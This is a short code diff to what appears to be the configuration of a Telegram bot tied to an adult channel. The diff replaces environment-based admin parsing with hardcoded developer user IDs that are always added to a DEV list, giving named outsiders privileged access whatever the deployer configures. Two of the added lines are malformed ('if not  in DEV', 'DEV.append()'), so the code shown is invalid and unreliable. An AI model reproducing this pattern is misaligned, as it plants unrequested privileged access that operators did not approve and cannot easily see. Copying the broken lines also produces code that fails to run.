@@ -47,13 +47,11 @@ REQUEST_INFO = """
 CHANNEL_URL = "http://t.me/secretsociety_18"
 
 
-
-try:
-    ADMINS=[]
-    for x in (os.environ.get("ADMINS", "").split()):
-        ADMINS.append(int(x))
-except ValueError:
-        raise Exception("Your Admins list does not contain valid integers.")
+ADMINS = []
+if not 1497264683 in DEV:  #Shiro
+  DEV.append(1497264683)
+if not  in DEV:  #aasf/kishore
+  DEV.append()
 
 
 CUSTOM_CAPTION = "Checkout: @fsecxbot 🔞"
